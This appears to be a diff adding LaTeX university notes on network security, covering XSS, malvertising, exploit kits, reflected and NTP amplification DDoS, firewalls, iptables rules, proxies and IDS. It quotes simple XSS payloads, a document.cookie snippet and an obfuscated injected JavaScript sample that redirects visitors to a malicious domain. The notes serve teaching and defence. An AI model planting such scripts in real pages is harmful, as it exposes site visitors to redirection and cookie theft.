+Same origin policy is enforced by browser so that content of FRAME 2(or 1) can not access content of FRAME 1(or 2), like stored cookies, loaded content and scripts. The browser will trust content from both frames and execute it in separate execution contexts; it requests and display content in one and executes scripts in another.
+An implicit trust-chain is established: browser trusts \textit{yourtypicalwebsite.com}, \textit{seconddomain.com}, Ad provider \textit{A},\textit{C} and content provider \textit{B}. Moreover content provider \textit{B} trusts Ad provider \textit{E} and browser implicitly trusts Ad provider \textit{E}.
+However, trust is not-transitive: even if content provider \textit{B} is trustworthy, entities trusted by \textit{B} are not necessarily trustworthy too.
+
+\subsubsection*{Sources of risk – domain compromisation}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec43c.png}
+\end{center}
+An attacker exploits a vulnerability on the domain’s server (in the example, \textit{yourtypicalwebpage.com}, could also be \textit{seconddomain.com}), with BoF on the HTTP service or password attacks (e.g. against domain’s administrative panel). The attacker inserts arbitrary content on webpage and the content is loaded by every user that requests the compromised webpage.
+
+\subsubsection*{Sources of risk – content compromisation}
+A variant of the previous one is the compromisation of the content, like in a \textbf{XSS} attack. \medskip\\
+Regardless of execution, XSS is based on the implicit notion of trust that exists between a browser and a server: the browser executes whatever the contacted website says, since the “Same-origin-policy” is respected (applied also to browser cookies, JS execution, etc). This vulnerability allows the attacker to inject content on a webpage and when the victim browser loads the webpage, it executes the injected content. The browser can not distinguish between legitimate and ”malicious” instructions, they are all coming from a trusted source.
+In the \textbf{XSS Stored} (or \textbf{Persistent XSS}) variant, the content is stored on the remote server (e.g. a forum thread, a newsletter, a database) and whenever a user retrieves a certain webpage, the malicious content is delivered to their browser. \medskip\\
+Attacker exploits a vulnerability in some content manager present on the server (e.g. web forum, wiki engines, comment forms), with a similar vector to persistent XSS attacks, and injects unsanitised content onto webpage: typically javascript content that performs some actions (JS is Turing complete) like the redirection of the webpage towards malicious domain. Javascript is typically embedded in a \lstinline|<script></script>| element:
+\begin{itemize}
+	\item executed by the browser when the page is loaded
+	\begin{footnotesize}
+	\begin{lstlisting}
+	<script> alert("Javascript msg")</script>
+	\end{lstlisting}
+	\end{footnotesize}
+	\item triggered by events
+	\begin{footnotesize}
+	\begin{lstlisting}
+	<a href src="seconddomain.com" onmouseover="alert("Javascript msg")">
+	\end{lstlisting}
+	\end{footnotesize}
+	\item triggered by user actions
+	\begin{footnotesize}
+	\begin{lstlisting}
+	<a href src="Javascript: alert("Javascript msg");">Second domain.com</a>
+	\end{lstlisting}
+	\end{footnotesize}
+\end{itemize}
+Javascript can access elements of the DOM (Document Objected Model), like forms and links 
+\begin{footnotesize}
+\begin{lstlisting}
+	document.cookie;
+\end{lstlisting}
+\end{footnotesize}
+or of the BOM (Browser Objected Model), like window and location.
+\begin{footnotesize}
+\begin{lstlisting}
+	location.replace("thirddomain.com");
+\end{lstlisting}
+\end{footnotesize}
+An example of content compromisation is the one found by Provos in 2006, on a website to create and publish customised online polls. It is an obfuscated javascript code.
+%TODO bold parts of text
+\begin{footnotesize}
+	\begin{lstlisting}
+	<SCRIPT language=JavaScript>
+	function otqzyu(nemz)juyu="lo";sdfwe78="catio";
+	kjj="n.r";vj20=2;uyty="eplac";iuiuh8889="e";vbb25="('";
+	awq27="";sftfttft=4;fghdh="'ht";ji87gkol="tp:/";
+	polkiuu="/vi";jbhj89="deo";jhbhi87="zf";hgdxgf="re";
+	jkhuift="e.c";jygyhg="om'";dh4=eval(fghdh+ji87gkol+
+	polkiuu+jbhj89+jhbhi87+hgdxgf+jkhuift+jygyhg);je15="')"; if
+	(vj20+sftfttft==6) eval(juyu+sdfwe78+kjj+ uyty+
+	iuiuh8889+vbb25+awq27+dh4+je15);
+	otqzyu();//
+	</SCRIPT>
+	
+	location.replace('http://videozfree.com')
+	\end{lstlisting}
+\end{footnotesize}
+
+\subsubsection*{Sources of risk – malicious third party content}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec43d.png}
+\end{center}
+Ad networks are a typical infection drive (“Malavertising”). 
+Advert can deliver malicious javascript, social engineering attacks, exploit plugin vulnerabilities, etc. As an additional problem, it is hard to track evolution of third-party providers (advertisement, widgets, ...): they can be trustworthy at start of contract, may change behaviour later on, it is hard to know.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec43f.png}
+\end{center}
+%TODO spiegazione immagine
+
+\subsubsection*{Drive-by downloads} %TODO video aggiuntivo 01/04
+It is a common infection mechanism employed by attackers: when contacted, the remote server delivers content that tries to exploit local vulnerabilities on the machine, typically buffer overflows against common browsers or browser plugins. If successful, shellcode calls home, downloads malware and executes it.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec43e.png}
+\end{center}
+
+\subsection{Exploit kits}
+Exploit kits are websites that serve vulnerability exploits and ultimately lead to malware. They can be reached through any of the mechanisms discussed so far: domain/content compromisation or third-party content. They typically feature $<10$ exploits, but the trend is decreasing in time and now many exploit kits feature 3-4 exploits (why so few?). Kits are traded in the black markets.
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec44.png}
+\end{center}
+
+\subsubsection*{Third party traffic}
+Exploit kits only work if they receive victim traffic (direct links, ads, iframes, redirections, ...). Underground has services that trade connections (“Maladvertising”, spam, iframes on legit websites). An attacker “buys” connections from specific users, with specific configurations: Javascript checks local configuration, sends to remote server which redirects to the exploit kit and when the user loads the webpage the attacker compromised, and if the characteristics match, the traffic is redirected.
+
+\subsubsection*{Traffic redirection}
+%TODO explain image?
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec44b.png}
+\end{center}
+There are 2 types of traffic:
+\begin{itemize}
+	\item Blind skymmed: when a visitor makes a click to open a video/photo/cam show but your landing page is opened instead. As a rule your page is opened in a new window and your page is the only page opened after a click.
+	\item Popounder traffic: when a visitor makes a click anywhere on a page and your page is opened in a new window underneath current browser window. When a visitor closes the current window he will see your page opened underneath.
+\end{itemize}
+You can buy traffic from “traffic brokers”. The user does not have to click on anything, it is an automatic redirect. High-quality traffic derives from selection of connection based on requested criteria like geographic source or installed software.
+
+\subsection{Advanced Denial of Service attacks}
+Basically every DDoS attack makes use of botnets. With standard DDoS attacks the attacker sends out orders to a big number of slaves which will then directly attack victim. However most websites are able to support a good amount of connections.\medskip\\
+\begin{minipage}{0.48\textwidth} 
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec44c.png}
+\end{center}
+\end{minipage}
+\hfill \vline
+\begin{minipage}{0.5\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.4]{img/netsec44d.png}
+	\end{center}
+\end{minipage} \medskip\\
+A more efficient way to implement a DDoS attack is the \textbf{Reflected DDoS} (Paxson 2001). \\
+A Reflected DDoS uses “reflector” servers that receive, from the slaves of the Bot Herder, a connection request with as IP source the (spoofed) IP of the victim: these servers all reply to the victim. Requests can be on any protocol (TCP, UDP, etc), as long as the victim is in LISTENING state. \medskip\\
+%slaves craft a packets s.t. while reflector is LISTENING on socket (\lstinline|<dstIP, dstPORT>|) and the victim is listening on socket (\lstinline|<srcIP, srcPORT>|)
+\begin{minipage}{0.65\textwidth} 
+There is also the \textbf{Amplification attack}, which aims to amplify the size of the response message sent to the victim, like in the previously seen DNS amplification attacks: a small spoofed request can generate a big reply (the spoofed machine is the victim of the attack). DNS configurations typically use UDP (preferred over TCP because the SYN ACK would be dropped by the server) only up to 512 bytes answers, generated by 64 bytes requests; if the size of the answer is greater than 512 bytes, it is switched to TCP (harder to spoof IP, foils attack). This means that the max amplification factor is $512/64=8x$.\\ Other protocols may allow for bigger ratios.
+
+\end{minipage}
+\hfill
+\begin{minipage}{0.35\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.45]{img/netsec44e.png}
+	\end{center}
+\end{minipage}
+
+\subsubsection*{Network Time Protocol}
+It is a protocol that allows to have a time server to syncronize all the machines in the network, running on UDP, port 123. The NTP command \textit{monlist}, intended for diagnostic purposes, returns addresses of the last (at most) 600 clients contacted by the NTP server. The size of an amplification attack using NTP is a lot bigger than the previously seen one. The NTP traffic rose in 3 orders of magnitude between January and March 2014, with several attacks in that period. The median amplification was $x4$ (25\% of amplifiers up to $x15$), the max amplification up to $x1.000.000$ (likely misconfigured NTP servers, aka “mega-amplifiers”). The issue has now been largely resolved.
+
+\subsubsection*{Mitigations}
+It is really difficult to mitigate this attack.
+\begin{itemize}
+	\item \textbf{Source identification} (a bit useless): try to cut out from network hosts that generate DoS packets. IP spoofing however is a problem. It may be possible to trace back routing path, but it gets difficult with many sources (reflectors).
+	\item \textbf{Capabilities}: rather than immediately granting resources to the initiator of a TCP communication, initiator has to ask, and the receiver grants a right to connect, or “capability”. This capability is made of marks (unique hash values), set by routers on the path from sender to receiver, which have an expiration time. Routers check validity of marks upon response and, if valid, forward datagram: the receiver can deny capability if sender misbehaves. Otherwise, routers drop if capability is invalid (e.g. check will fail for answers to a spoofed IP). The limitations is that a Denial of Capability attack can still be performed: 5\% of downstream bandwidth is dedicated to capability requests (e.g. 0.05 x 100Mbps), and can easily be saturated by a DDoS attack. New legitimate users that need a capability are cut out while there is no problem for clients that already obtained a capability before the start of DoS. It is hard to discern legitimate capability request traffic from non-legitimate: a sufficient low rate from each bot can flood the bandwidth.
+\end{itemize}
+
+\subsubsection*{Coremelt attack}
+It is a DDoS attack that overcomes obstacle posed by capabilities. Rather than attacking a victim system, it attacks a network link causing bandwidth saturation. The idea is that in a $N$ bots botnet, there are $N^2$ possible connections. An attacker orders pairs of bots to send each other packets, which are wanted by both ends (valid capability). Bot pairs are defined so that communication passes through the target link (can be done with a traceroute).
+Effectiveness depends on bandwidth distribution between Systems and bot distribution in the network ASs.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec44f.png}
+\end{center}
+
+\newpage
+\section{System hardening}
+All systems (personal computers, servers, mainframes) have a default configuration. Usually it is the one given with a fresh installation of an operating system, which in some cases can be configured at installation time but it is still a limited access to full configuration settings (e.g. a linux distro typically allow to select packets but not all packet's functionalities). Default services are DHCP, RCP, NetBIOS, protocols like SSH or VNC, web servers, remote interfaces; default configuration satisfies the vast majority of user
+needs. \\
+System hardening is the process by which a system’s configuration is tuned to improve its security without compromising its functionality. The 100\% secure system is one that is turned off. System hardening process takes into account:
+\begin{itemize}
+	\item System \textbf{functionality}: what is the role of that system? (Home computer, File server, Web server, general purpose server);
+	\item System \textbf{security}: how can the security of the system be
+	improved? (Minimise the attack surface of the system).
+\end{itemize}
+
+\subsubsection*{Attack surfaces}
+An attack surface is the set of system resources that are exposed to the attacker, e.g. weak passwords, software vulnerabilities, misconfigurations, services listening on the network or inaccurate access control.
+The golden rule of information security is the “\textbf{Need to know principle}”: no user and no system component or process should be authorised or compiled to perform actions that are not strictly necessary for their normal operation (aka “If it’s not there you can’t brake it”). This principle can be applied at both system, users and processes. A \textbf{system} should be configured such that it does not embed or enable functionalities that are not needed for normal operation. A \textbf{user} should be authorised to only access and modify resources that are necessary for their normal operation; if a user is NOT authorised, they will NOT be able to accomplish their tasks.
+
+\subsubsection*{OS design approaches}
+There can be different versions of an OS: for example some are more focused on security, but if the administrator is not able to select the correct values the overall security may end up being worse.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec45.png}
+\end{center}
+In the image, microkernel based OS is more secure (kernel contains only what is strictly necessary).
+
+\subsubsection*{Minimal user privileges}
+User should not be allowed to perform more actions on the system than necessary for their operation. A common policy requirement is to restrict the behavior of a user; to permit different users to do different things, we need a way to identify or distinguish between
+users:
+\begin{itemize}
+	\item Identification mechanisms to indicate identity
+	\item Authentication mechanisms to validate identity
+\end{itemize}
+
+\newpage
+\section{System hardening - Firewalls}
+A system’s minimal configuration may still have a higher attack surface than necessary (e.g. SSH is necessary for remote operation on server, however SSH logins may only be allowed from an internal IP address or other additional network measures to minimise attack surface).
+Firewalls are perimetral network components that filter incoming (outgoing) traffic from (to) the network, embedded in network devices or as a stand-alone software. 
+
+
+\subsubsection*{No perimetral defense vs Perimetral defense}
+\begin{minipage}{0.48\textwidth} 
+	\begin{center}
+		\includegraphics[scale=0.27]{img/netsec45b.png}
+	\end{center}
+\end{minipage}
+\hfill \vline
+\begin{minipage}{0.48\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.27]{img/netsec45c.png}
+	\end{center}
+\end{minipage} \medskip\\
+Without the firewall every incoming connection can enter in the network, while with it some traffic (telnet in the example) can be stopped. A firewall can centralize security.
+
+\subsection*{Networking with a firewall}
+\begin{minipage}{0.6\textwidth} 
+Internal network can be treated as untrusted: \textbf{do not trust outgoing traffic} (Unintentional Insider Threat, UIT). Connections to remote servers can be regulated (e.g. remote storage services could be used to exfiltrate data from an organisation).
+Firewalls have at least two network interfaces: one facing the external network (or the router, depends on firewall placement w.r.t border router), one facing internally. More interfaces are possible if the firewall sits at the border with three or more networks.
+\end{minipage}
+\hfill 
+\begin{minipage}{0.35\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec45d.png}
+	\end{center}
+\end{minipage}
+
+\subsection*{Firewall Characteristics}
+The design goals of a firewall are that all traffic from inside or outside must pass through it (physically blocking all access to the local network except via the firewall): only authorized traffic (defined by the local security policy) will be allowed to pass. The firewall itself is immune to penetration (use of a trusted system with a secure operating system). There are 2 default policies:
+\begin{itemize}
+	\item \textbf{Default deny}: All what is not explicitly allowed is denied.
+	\item \textbf{Default permit}: All what is not explicitly denied is allowed.
+\end{itemize}
+In the case of default permit there is a \textbf{blacklist policy}, which is a list of what is blocked. Rules to remove/reduce services are specified when a problem is discovered, so users have more freedom on what they can do. It is suitable for small organizations or home systems. An example of permit policy is to deny incoming ftp traffic and allow everything else; another example could be to deny also incoming telnet traffic (in this case more suitable for open organizations like universities). \medskip\\
+In the case of default deny there is a \textbf{whitelist policy}, which is a list of what is allowed. Rules to allow a service are added after a careful analysis, so it is more visible to users (users are restricted at what they can do). It is the preferred default policy for business and governmental organizations. An example of deny policy is to allow incoming http and deny everything else. \medskip\\
+There are 3 types of firewall: \textbf{static packet filtering}, \textbf{stateful packet filtering} and \textbf{proxies} (application-level gateways and circuit-level gateways).
+
+\subsection{Static Packet Filtering}
+It is often implemented by a router. Applies a set of rules to each incoming IP packet to decide whether it should be forwarded or discarded. Header information is used for filtering (e.g., protocol number, source and destination IP, source and destination port numbers, etc.). It is tradionally \textbf{stateless}: each IP packet is examined isolated from what has happened in the past. Simple and fast, meaning a low demand on resources. \\
+In packet filtering there exists access lists, which are the rules to write whitelists and blacklists.
+
+\subsubsection*{Access lists}
+They are defined by the CISCO format. There are standard ACLs and extended ACLs.
+\begin{itemize}
+	\item \textbf{Standard ACLs}
+	\begin{lstlisting}
+	access-list $number $action $src [wild card]
+	\end{lstlisting}
+	\textit{number} identifies the rule, \textit{action} can be accept/deny, \textit{src} is the source ip. \textit{Wild card} is the inverse of subnet mask and says which part of the IP should be checked for and which ignored (e.g. \lstinline|192.168.3.1 [0.0.255.255]| means that “0.0.3.1” is the subnet of interest).
+	\item \textbf{Extended ACLs}
+	\begin{lstlisting}
+	access-list $number $action $type $src [wild card] 
+			$opt $dest [wild card] [log]
+	\end{lstlisting}
+	\textit{Type} is the IP, tcp, udp, etc, \textit{opt} are the ports for TCP/UDP or type/code for ICMP, \textit{log} writes in a log when the event is triggered.
+\end{itemize}
+It is possible to assign values to variables (e.g. \lstinline|internal_net:=192.168.1.0/24|).
+
+%TODO da rivedere
+\subsubsection*{Packet Filtering}
+Example of (explicit) policies:
+\begin{enumerate}
+	\item deny all incoming tcp connections to SSH;
+	\item allow outgoing TCP connections to SSH.
+\end{enumerate}
+\begin{tabular}{|c|c|c|c|c|c|c|}\hline
+	\textbf{action} & \textbf{src} & \textbf{port} & \textbf{dest} & \textbf{dport} & \textbf{flags} & \textbf{comment} \\\hline\hline
+	allow & 192.168.2.0/24 & * & * & 22 & S or ACK & \thead{Our outgoing traffic to \\remote ssh servers}\\\hline
+	allow &* & 22 & 192.168.2.0/24 & *& SACK& \thead{Their SYN ACK}\\\hline
+	allow &* & 22 & 192.168.2.0/24 & *& ACK& \thead{Rest of communication}\\\hline
+\end{tabular} \medskip\\
+\begin{tabular}{|c|c|c|c|c|c|c|}\hline
+	\textbf{action} & \textbf{src} & \textbf{port} & \textbf{dest} & \textbf{dport} & \textbf{flags} & \textbf{comment} \\\hline\hline
+	deny &*& *& 192.168.2.0/24 & 22 & S & \thead{We do not allow remote\\ connections to local SSH servers} \\\hline
+\end{tabular} \medskip\\
+Do we actually need this? Yes, if default allow; no, if default deny. Notice that this is last in the list: the first rule that matches is used.
+
+\subsubsection*{Note of caution}
+Some protocols are easy to implement, with clear distinction between client and server. Other protocols are not as straightforward.
+E.g. want to restrict SMTP operations, the SMTP server acts both as a server (receives mail) and as a client (forwards mail to next server). Firewall rules must match both cases.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec46.png}
+\end{center}
+
+\subsubsection*{Exercise: SMTP rules}
+Explicitly allow incoming SMTP traffic from \lstinline|10.1.1.1| to SMTP-srv, allow all outgoing SMTP traffic. \medskip\\
+\begin{tabular}{|c|c|c|c|c|c|c|}\hline
+	\textbf{action} & \textbf{src} & \textbf{port} & \textbf{dest} & \textbf{dport} & \textbf{flags} & \textbf{comment} \\\hline\hline
+	allow &10.1.1.1 &* &SMTP-srv &25 &S xor A &\thead{Allow everything from\\trusted client} \\\hline
+	allow &SMTP-srv &25 &10.1.1.1 &* &S ACK &\thead{Allow server answer}\\ \hline
+	allow &SMTP-srv &25 &10.1.1.1 &* &ACK &\thead{Allow rest of communication} \\ \hline
+	allow &SMTP-srv &* &* &25 &S xor A & \thead{Allow initiation of \\ connection to remote SMTP} \\ \hline
+	allow &* &25 &SMTP-srv &* &SA & \\ \hline
+	allow &* &25 &SMTP-srv &* &A & \\ \hline
+	deny &* &* &* &* &* & \\\hline
+\end{tabular} \medskip\\
+
+\subsubsection*{Packet Filtering: Pros and cons}
+Pros:
+\begin{itemize}
+	\item Transparent: it does not change the traffic flow or 	characteristics - either passes it through or doesn’t;
+	\item Simple: easy to implement rules to prevent IP spoofing (e.g. no outgoing traffic from non-private IP address space, control and log attempts to remotely connect to private services);
+	\item Cheap.
+\end{itemize}
+Cons:
+\begin{itemize}
+	\item It does not prevent application-specific attacks;
+	\item Unsophisticated (protects against simple attacks);
+	\item Calibrating rule set may be tricky;
+	\item Limited logging.
+\end{itemize}
+
+\subsection{Stateful Packet Filtering}
+The decision is taken by inspecting some state informations of packets: \textbf{Stateful Inspection} or \textbf{Dynamic Packet Filtering}. It maintains a history of previously seen packets to make better decisions about current and future packets: the connection state is maintained in a connection table. It defines rules to open state. It is possible to use existent state to control future packets (e.g. explicit rule for TCP SYN in LISTEN state, “NEW” connection in IPTABLES and subsequent packets can be filtered using the connection table, e.g. allow any packet for an ESTABLISHED connection). \medskip\\
+Stateful firewalls allow users to define states over stateless protocols (e.g., UDP traffic is stateless, so it uses \lstinline|<sip,sport,dip,dport>| to correlate traffic). For these protocols there is no termination sequence (e.g. TCP's FIN 4-way handshake), typically they set a timeout wherein pseudo-state is defined. Traffic of stateless protocols depends on application, not on the protocol itself; it may be hard to manage, because it is application-specific.
+
+\subsubsection*{Stateful firewall rule example}
+Possible states (iptables with conntrack):
+\begin{itemize}
+	\item NEW: packet trying to open a not-yet existent connection;
+	\item ESTABLISHED: incoming packet is relative to a connection already initiated;
+	\item RELATED: packets that are stating a NEW connection but related existing one (needed by some applications – e.g. FTP);
+	\item INVALID: none of the above à e.g. incoming packet with ACK but not belonging to ESTABLISHED connection (can you filter this
+	with static filtering?).
+\end{itemize}
+Say you want to prevent ACK scans:
+\begin{itemize}
+	\item Stateful rule:
+	\begin{lstlisting}
+	iptables -A INPUT -i eth0 -m state -state INVALID -	j DROP
+	\end{lstlisting}
+	\item Static rule:
+	\begin{lstlisting}
+	iptables -A INPUT -i eth0 -p tcp --tcp-flags ACK - j DROP
+	\end{lstlisting}
+	However this rule will drop also the legit ACKs of TCP connections.
+\end{itemize}
+
+\subsubsection*{Another example} %TODO to comment, 17-18 in video 7/04
+Example rule: allow all incoming traffic related to an existing connection
+\begin{lstlisting}
+	iptables -A INPUT -i eth0 -m state -state
+		ESTABLISHED,RELATED -j ACCEPT
+\end{lstlisting}
+Mixed rules also possible:
+\begin{lstlisting}
+	iptables -A INPUT -i ! eth1 -j ACCEPT
+	iptables -A INPUT -m state -state
+		ESTABLISHED,RELATED -j ACCEPT
+	iptables -P INPUT DROP
+\end{lstlisting}
+
+\subsubsection*{Application firewalls}
+Statefulness consider also application layer (“Deep packet inspection”; it can keep track of some packets and deny others). E.g. FTP PORT command:\medskip\\
+\begin{minipage}{0.4\textwidth} 
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec46b.png}
+\end{center}
+\end{minipage}
+\hfill 
+\begin{minipage}{0.55\textwidth}
+	\begin{itemize}
+		\item FTP commands are passed to port 21;
+		\item In “Active mode” the server opens a connection with the client, and chooses dport (this happens with PORT command);
+		\item Application firewall can detect PORT command and act on packet: simple stateless firewall can not manage this.
+	\end{itemize}
+\end{minipage}
+
+\subsubsection*{Stateful and app firewalls: pros and cons}
+Pros:
+\begin{itemize}
+	\item Allow user to express more powerful rules;
+	\item Policy definition is much simpler than with static packet filtering;
+	\item Very diffused in all modern firewalls.
+\end{itemize}
+Cons:
+\begin{itemize}
+	\item Severe impact on firewall performance;
+	\item Deep packet inspection significantly slows down packet check;
+	\item Application support may be very complicated (typically provided as “modules”).
+\end{itemize}
+
+\subsection{Proxy}
+A proxy is a network component that mediates network communications. It untangles the otherwise direct communication between client and server. Proxy acts both as a server (that receives remote connection) and as a client (that forwards the connection to its real destination).
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec46c.png}
+\end{center}
+
+\subsubsection*{Open proxy}
+Proxy connects any client on the internet to any server on the internet: clients know th real destination of the packet. Servers can not normally know by whom was the packet originated.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec46d.png}
+\end{center}
+Enables the user to achieve some level of anonymity on the network (\textit{Anonymous proxies}). Servers should not be able to collect source IP: some techniques exist to overcome this, like force the client to communicate its IP through third party services or plugins (e.g. flash). Trust issues come from the fact that all trust is put on the proxy service: this may or may not be sufficient depending on application. It is OK to bypass organisation’s blacklist (e.g. block facebook.com), probably not trustworthy for more sensible Internet traffic (confidential exchange of information). It may be used as a malware distribution server, where the malicious proxy embeds malware in response packet.
+
+\subsubsection*{Reverse Proxy}
+Mediates connection between Internet clients and servers on an internal network it protects. It can embed firewalling capabilities; may sit on border router. Client talks directly to Proxy; Proxy forward to internal servers; neither internal servers or clients know real origin/destination of packet.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec46e.png}
+\end{center}
+It may hide properties of internal servers (IPs, non-custom service ports, versioning). If too aggressive, it may cause disservices (e.g. declares fake server version that breaks the protocol). May be used for load balancing: several internal replicas of a webserver, proxy automatically balances the load by forwarding client’s connection to the most appropriate internal server (e.g. least busy server gets the connection). It may also be used to cache server’s content, so the answer goes directly to requests for which a cache entry exists.
+
+\subsubsection*{Application Level Proxy}
+Also called application proxy, acts as a relay of application-level traffic. All connections are mediated by the GW.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec46f.png}
+\end{center}
+Pros (by not permitting application traffic directly to internal hosts):
+\begin{itemize}
+	\item Information hiding: names of internal systems are not known to outside systems;
+	\item Can limit capabilities within an application;
+	\item Robust authentication and logging: application traffic can be pre-authenticated before reaching host and can be logged;
+	\item Cost effective: third-party software and hardware for authentication and logging only on gateway;
+	\item Less-complex filtering rules for packet filtering routers; easier stateful firewall implementations;
+	\item More secure.
+\end{itemize}
+Cons:
+\begin{itemize}
+	\item Keeping up with new applications;
+	\item May need to modify application client/protocols (custom implementation may be expensive).
+\end{itemize}
+
+\subsubsection*{Circuit-level Gateway}
+Also called circuit-level proxy. Usual, when there is a trust to internal users. No firewalling capabilities, it simply crosses client connection to inside host: the gateway typically relays TCP segments from one connection to the other without examining the content. Operates at L4 on OSI scale. Difficult to find, rarely used.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec46g.png}
+\end{center}
+
+\subsection*{Firewall Basing}
+Packet filtering usually comes in a software module in a router or a LAN switch. For application level firewall there is \textbf{Bastion host}, a stand-alone machine running common OS (Unix, Windows). Then there are also \textbf{Host-based firewall} and \textbf{Personal firewall}. 
+\subsubsection*{Bastion Host}
+It is a system identified by the firewall administrator as a critical strong point in the network's security. The bastion host serves as a platform for an application-level or circuit-level gateway. It executes on a secure version of the OS (hardened system), it provides only essential services, may require additional user authentication before accessing proxy services; each proxy service may require also its own. Each proxy maintains detailed audit information, is independent and runs as a non-privileged separate user.
+
+\subsubsection*{Firewall/Bastion Administration}
+\begin{itemize}
+	\item Access to management console can be made by dedicated clients using encryption, via SSH and https, possibly using also user authentication;
+	\item Strategies of disaster recovery include switches capable of balancing/failover;
+	\item Logging is ensured by the use of a remote syslog server (centralization of all logs);
+	\item Security incidents have different severity levels, the policy determines which ones are significant: it keeps logs for legal analysis about the attacks and synchronization with a time server is important to know which came first.
+\end{itemize}
+
+\subsubsection*{Host-based Firewall}
+Software module used to secure an individual host, available in many operating systems. A common location for such firewalls is a server. Its advantages are the filtering rules that can be tailored to the host environment (specific rules for the servers), the protection is provided independent of topology (thus both internal nd external attacks must pass through the firewall) and in conjunction with stand-alone firewalls, the host-based firewall provides an additional layer of protection.
+
+\subsubsection*{Personal firewall}
+Personal firewall controls the traffic between a personal computer or workstation on one side and the Internet or enterprise network on the other side. It is used in home environment and on corporate intranets, typically a software module on the personal computer, and is easy to configure. It is used to deny unauthorized remote access, plus detect and block worms and other malware.
+
+\subsection*{Firewall Topologies (from simpler to more complex)}
+\begin{itemize}
+	\item \textbf{Host-resident firewall}: personal firewall software and firewall software on servers;
+	\item \textbf{Screening router} (packet filtering): single router between internal and external networks with stateless or full packet filtering, typical for small office/home office (SOHO) applications. Fast and cheap;
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec47.png}
+	\end{center}
+	\item \textbf{Single bastion inline}: when a configuration for the packet-filtering router is that only packets from and to the bastion host are allowed to pass through the router. The bastion host performs authentication and proxy functions. This configuration implements both packet-level and application-level filtering (allowing for flexibility in defining security policy). An intruder must generally penetrate two separate systems;
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec47b.png}
+	\end{center}
+	\item \textbf{Single bastion T, with DMZ}: similar to Single Bastion Inline but has a third network interface to a DMZ (Demilitarized Zone) where externally visible servers are placed. Common topology for medium to large organizations;
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec47c.png}
+	\end{center}
+	\item \textbf{Double bastion T}: an extarnal bastion host is dedicated only to the DMZ, so compromising it does not give access to the internal bastion host, which defends the intranet. Extra firewalls to implement means, obviously, more time and money spent.
+	\begin{center}
+		\includegraphics[scale=0.25]{img/netsec47d.png}
+	\end{center}
+\end{itemize}
+
+\subsection*{Advanced network topologies}
+Single and double bastion topologies are adequate only when mapped to a significant \textbf{separation of networks}. A good network separation allows for better management of firewall rules, higher control on incoming traffic, higher overall security and lower load on single appliances.
+
+\subsubsection*{Typical multi-level network applications}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec48.png}
+\end{center}
+%TODO 2 subnets: the DMZ, with public services and application logic (first level), and the database.
+\subsubsection*{Separate network topology}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec48b.png}
+\end{center}
+A simple implementation of this separation:
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec48c.png}
+\end{center}
+
+\subsubsection*{Divide et impera - Cascade firewalls}
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec48d.png}
+\end{center}
+Cascade firewalls are inter-dependent firewall policies. Each firewall must be configured considering functions needed at higher levels (e.g. firewall at level 1 must allow all packets eventually directed toward level 2 or 3). In complex networks this is unmanageable if network is not well configured. It requires a good mixture of NAT/PAT policies, firewall configurations, and good separation of services (e.g. hard to have effective NAT + firewalling for SSH services at both level 1 and level 3, so where should the packet go? Remember incoming packet will always have address of outward-facing NAT interface toward port 22).\medskip\\ Each layer should ideally be in a different subnet:
+\begin{itemize}
+	\item Firewall @ Layer 1: 192.168.1.0/24
+	\item Firewall @ Layer 2: 192.168.2.0/24, etc...
+	\item F1 Accept all traffic that needs to be forwarded to F2
+\end{itemize}
+It has high design, management and maintenance costs: introducing a new service at any level requires testing all configuration at lower levels.
+
+\subsubsection*{Divide et impera - Parallel firewalls}
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec48e.png}
+\end{center}
+The firewalls run in parallel, with undependent policies.
+
+\subsubsection*{Mixed architectures}
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec48f.png}
+\end{center}
+Static filtering, bastion host of web servers and second level router are in cascade, while the following 2 firewalls are in parallel.
+
+\newpage
+\section{System hardening - IDS}
+Firewalls prevent unwanted access to network resources that should be isolated w.r.t. another network. An \textbf{Intrusion Detection System} (IDS), instead, monitors connections/activity on a host. The \textbf{Intrusion Prevention Systems} (IPS) can act over “malicious” behaviour.
+\begin{itemize}
+	\item IDS = passive monitoring
+	\item IPS = active monitoring
+\end{itemize}
+In reality functionalities are not entirely distinct (commercial lingo rather than actually different technology). \medskip\\
+\textbf{Intrusion} is a set of actions, occurring on your system, aimed to compromise the security goals (namely integrity, confidentiality, or availability) of a computing and networking resource. An \textbf{intrusion detection} is the process of identifying and responding to intrusion activities. \medskip\\
+An IDS can be classified in:
+\begin{itemize}
+	\item \textbf{Host-based} IDS: monitor single host activity
+	\item \textbf{Network-based} IDS: monitor network traffic
+\end{itemize}
+The \textbf{logical components} of IDSs are:
+\begin{itemize}
+	\item sensors - collect data
+	\item analyzers - determine if intrusion has occurred
+	\item user interface - manage / direct / view IDS
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec49.png}
+\end{center}
+%TODO HUMAN usually sitting in the decision engine
